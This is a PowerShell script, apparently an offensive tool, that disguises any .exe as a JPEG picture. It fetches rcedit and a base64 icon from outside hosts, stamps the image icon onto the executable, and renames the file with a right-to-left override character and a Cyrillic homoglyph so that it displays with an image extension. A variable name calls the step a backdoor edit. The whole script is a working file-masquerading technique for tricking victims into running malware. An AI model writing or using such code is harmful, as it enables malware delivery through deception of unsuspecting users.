[CmdletBinding()]
Param (
    [Parameter(Mandatory=$true)]
    [ValidateScript({

        if ([System.IO.Path]::GetExtension($_) -eq ".exe") { $true }
        else { throw "You want to obfuscate an exe file !" }
    
    })]
    [string]$exeTObfs
)

# Items to Downloads

$rceditUrlgit='https://github.com/electron/rcedit/releases/download/v2.0.0/rcedit-x64.exe'
$JpgIcoUrltxt='https://friendpaste.com/4y8LNw4UqeFLwhBhZlafrf/original?rev=353063333130'

# Fake .jpeg extension

$fakeJPEG = (-join("gep", [char]0x0458, ".exe"))

# Configurations & install

$toolkitDir=(-join($env:LOCALAPPDATA,'\','rcedit'))
$rcEditExeDir=(-join($toolkitDir,'\','exe'))
$rcEditIcoDir=(-join($toolkitDir,'\','icons'))
$JpgIconPath=(-join($rcEditIcoDir,'\','jpg.ico'))
$rcEditExePath=(-join($rcEditExeDir,'\','rcedit-x64.exe'))
$rcEditDirs=@($rcEditExeDir,$rcEditIcoDir)

if(-not [System.IO.File]::Exists($rcEditExePath)){

    foreach($rcEditInstall in $rcEditDirs){

        [System.IO.Directory]::CreateDirectory($rcEditInstall) 2>&1 | out-null    
    
    }

    $tmpTXTB64 = (-join($env:TMP,'\','tmpImg.txt'))
    Invoke-WebRequest -Uri $JpgIcoUrltxt -OutFile $tmpTXTB64 -MaximumRedirection 1
    $base64Content = Get-Content -Path $tmpTXTB64 -Raw
    $iconBytes = [System.Convert]::FromBase64String($base64Content)
    [System.IO.File]::WriteAllBytes($JpgIconPath, $iconBytes)
    Remove-Item -Recurse $tmpTXTB64
    Start-BitsTransfer -Source $rceditUrlgit -Destination $rcEditExePath
    Write-Host "rcedit has been downloaded and installed in $rcEditExeDir"

}

# Edit

$bkdoor_Edit = "& $rcEditExePath $exeTObfs --set-icon $JpgIconPath"
Invoke-Expression $bkdoor_Edit
Rename-Item -Path $exeTObfs -NewName ("Ann" + ( [char]0x202E ) + $fakeJPEG)
